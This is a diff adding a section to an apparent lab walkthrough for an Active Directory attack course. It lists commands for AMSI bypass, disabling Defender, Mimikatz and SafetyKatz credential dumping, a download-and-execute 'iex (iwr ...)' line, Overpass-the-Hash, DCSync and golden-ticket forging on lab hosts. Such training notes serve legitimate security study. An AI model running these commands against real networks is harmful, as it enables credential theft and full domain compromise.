@@ -822,3 +822,356 @@ winrs -r:dcorp-dc cmd
 
 
 
+**Remember when we use bloodhound to enumerate shortest path to domain admin and we got `dcorp-adminsrv`, Yeah that is who a derivative local admin is**
+
+- Load invisi-shell and AMSI bypass into your MS-DOS session
+
+
+![](https://i.imgur.com/KDFf7s8.png)
+
+
+- find out the machines on which we have local admin privileges
+
+```powershell
+cd C:\AD\Tools
+
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+
+Find-PSRemotingLocalAdminAccess
+```
+
+
+**_Example -:_**
+
+
+![](https://i.imgur.com/rDIDPEa.png)
+
+**We have local admin on the dcorp-adminsrv**
+
+
+
+- check if **Applocker** is configured on `dcorp-adminsrv` by querying **registry keys**
+
+```powershell
+# spawn active shell on dcorp-adminsrv
+winrs -r:dcorp-adminsrv cmd
+
+# Query registry keys
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+```
+
+
+![](https://i.imgur.com/IuN7laB.png)
+
+
+**We can go ahead and enumerate this registry keys to check if there is a policy that can favor us**
+
+
+```powershell
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script
+
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
+```
+
+
+
+**_Example_**
+
+
+![](https://i.imgur.com/2ajE9HQ.png)
+
+
+**We have got an interesting policy in \Script that allows everyone to run programs, Signed binaries and scripts located under "C:\ProgramFiles" That means, we can drop scripts in the Program Files directory there and execute them**
+
+- First, disable Windows Defender on the `dcorp-adminsrv` server
+- Before this exit the `winrm` session and use `PS Remoting`
+
+
+```powershell
+Enter-PSSession dcorp-adminsrv
+
+# Disable windows defender
+Set-MpPreference - DisableRealtimeMonitoring $true -Verbose
+```
+
+
+**_Example_**
+
+
+![](https://i.imgur.com/zlZYDq2.png)
+
+
+
+### **Step 1 - Create Invoke-MimiEx.ps1**
+
+
+-  Create a copy of **Invoke-Mimi.ps1** and rename it to **Invoke-MimiEx.ps1**.
+- Open **Invoke-MimiEx.ps1** in PowerShell ISE (Right click on it and click Edit).
+- Add `Invoke-Mimi -Command '"sekurlsa::ekeys"'`  to the end of the file.
+
+
+**_Example_**
+
+
+![](https://i.imgur.com/OgF704m.png)
+
+
+
+- On student machine run the following command from a PowerShell session
+
+
+```powershell
+Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+
+- Confirm if the file has been transferred
+
+```powershell
+[dcorp-adminsrv]: PS C:\Users\student505\Documents> cd 'C:\Program Files\'
+
+[dcorp-adminsrv]: PS C:\Program Files> ls
+
+[SNIP]
+-a----   12/11/2023   2:45 PM        2070874 Invoke-MimiEx.ps1
+```
+
+
+- Run the modified mimikatz script on `dcorp-adminsrv`
+
+
+```powershell
+[dcorp-adminsrv]: PS C:\Program Files> .\Invoke-MimiEx.ps1
+```
+
+
+**Here we find the credentials of the srvadmin, appadmin and websvc users.**
+
+
+
+We will use **OverPass-the-Hash**, to use **srvadmin's** credentials using `SafetyKatz.exe`
+
+
+- Spawn an elevated powershell from the student VM (**Run as Administrator**)
+
+
+```powershell
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
+```
+
+- You should now have a new process/shell
+- Check if srvadmin has admin privileges on any other machine.
+
+
+```powershell
+# Load invisi-shell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess -Verbose
+```
+
+
+**_Example_**
+
+
+
+![](https://i.imgur.com/EuTNkRr.png)
+
+
+**Hell yeah, we discovered a new machine `dcorp-mgmt`**
+
+### **Step 2 - SafetyKatz for extracting credentials**
+
+
+- Copy the `Loader.exe` to **dcorp-mgmt**:
+
+
+```powershell
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+
+
+- Extract Credentials
+- Make sure to host `SafetyKatz.exe` on **HFS** before running this command
+
+```powershell
+winrs -r:dcorp-mgmt cmd
+
+# Launch powershell
+powershell
+
+# Enable port Forwarding
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+
+# Extract Credentials
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
+
+
+**You could also use `Powershell Remoting`, As shown below**
+
+
+### **Step 2.1 - Using PS-Remoting**
+
+
+- Note that you have to exit from the 2 previous session by using the `exit` command twice before running the command below
+
+```powershell
+# Connect via PS-Remoting
+Enter-PSSession -ComputerName dcorp-mgmt
+```
+
+
+- Load AMSI Bypass
+- Download and Execute Invoke-Mimikatz as follows
+
+```powershell
+iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
+```
+
+- Extract Credentials
+
+```powershell
+# Extract Credentials
+Invoke-Mimi -Command '"sekurlsa::ekeys"'
+
+# Extract Credentials From Credentials Vault
+Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
+```
+
+
+### **Step 3 - OverPass-the-Hash Rubeus**
+
+- Spawn an elevated shell from the student VM (**Run as Administrator**)
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+
+- You should now see a new window/process come up as `svcadmin`, Run `klist` to confirm
+- Try accessing the domain controller from the new process!
+
+
+```powershell
+# To run command remotely
+winrs -r:dcorp-dc whoami
+
+# To get active shell
+winrs -r:dcorp-dc cmd
+```
+
+
+
+**_Things To Note Down_**
+
+- [ ] `aes256_hmac` is Mostly used for **OverPass-The-Hash** attack
+- [ ] **NTLM Hash** is called `rc4_hmac_nt`
+- [ ] To solve the question `Process using svcadmin as service account` -:
+	- You have to `winrs` into **dcorp-mgmt** after getting user `svcadmin`
+	- Then run `tasklist /svc` to view processes
+	- You should see `sqlsevr.exe`, The answer is definitely **sqlserver**
+
+
+
+# **Domain Persistence**
+
+
+### **Extract secrets from the domain controller of dollarcorp**
+
+
+- First of all spawn an elevated **MS-DOS** session and start a process with Domain Admin privileges.
+
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+- From the new process, copy `Loader.exe` on **dcorp-dc** and use it to extract credentials
+
+
+```powershell
+# Copy Loader.exe to DC
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+
+# Spawn interactive shell
+winrs -r:dcorp-dc cmd
+
+# Set up port forwarding
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
+
+# Extract Credentials
+# make sure to setup HFS first and host SafetyKatz.exe
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+
+# Run this command on the mimikatz session
+lsadump::lsa /patch
+```
+
+
+
+**_Example_**
+
+
+![](https://i.imgur.com/Wj7mI2N.png)
+
+
+
+### **Using the secrets of krbtgt account, create a Golden ticket.**
+
+
+- To get NTLM hash and AES keys of the krbtgt{or other users} account, we can use the DCSync attack
+
+- Run the below command from process running as Domain Admin
+
+
+```powershell
+# Exit mimikatz
+exit
+exit
+
+# Extracts Credentials
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+
+# Important Output -:
+Hash NTLM:
+aes256_hmac
+aes128_hmac
+```
+
+
+- We can then use `BetterSafetyKatz.exe` to create a Golden ticket using the **aes256_hmac** key from last output
+
+-  Run the below command from an elevated command prompt
+
+```powershell
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+
+
+- Now you should be administrator on `dcorp-dc`
+- Run `klist` to confirm
+
+![](https://i.imgur.com/LhaskQI.png)
+
+
+- You should now be able to run commands remotely
+
+```powershell
+dir \\dcorp-dc\c$
+
+# run WMI commands on the DC
+powershell
+gwmi -Class win32_computersystem -ComputerName dcorp-dc
+```
+
+
+**_Example_**
+
+
+![](https://i.imgur.com/btWJLpq.png)
+
+
+
